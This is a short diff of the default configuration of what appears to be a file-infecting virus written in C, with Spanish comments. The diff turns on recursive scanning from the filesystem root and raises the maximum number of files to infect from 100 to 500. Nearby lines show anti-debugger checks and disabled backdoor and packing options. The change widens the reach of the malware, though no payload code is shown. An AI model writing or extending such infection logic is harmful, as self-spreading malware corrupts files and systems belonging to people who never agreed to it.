@@ -8,7 +8,7 @@ t_config *config_create_default(void) {
     
     // Bonus disabled por defecto
     cfg->enable_32bit = true;
-    cfg->enable_recursive = false;
+    cfg->enable_recursive = true;   // BONUS 2: Recursive scanning from root
     cfg->enable_scripts = false;
     cfg->enable_packing = false;
     cfg->enable_backdoor = false;
@@ -25,7 +25,7 @@ t_config *config_create_default(void) {
     
     // Límites por defecto
     cfg->max_depth = 10;      // Profundidad recursiva
-    cfg->max_files = 100;     // Máximo de archivos a infectar
+    cfg->max_files = 500;     // Máximo de archivos a infectar
     
     // Anti-analysis habilitado
     cfg->check_debugger = true;
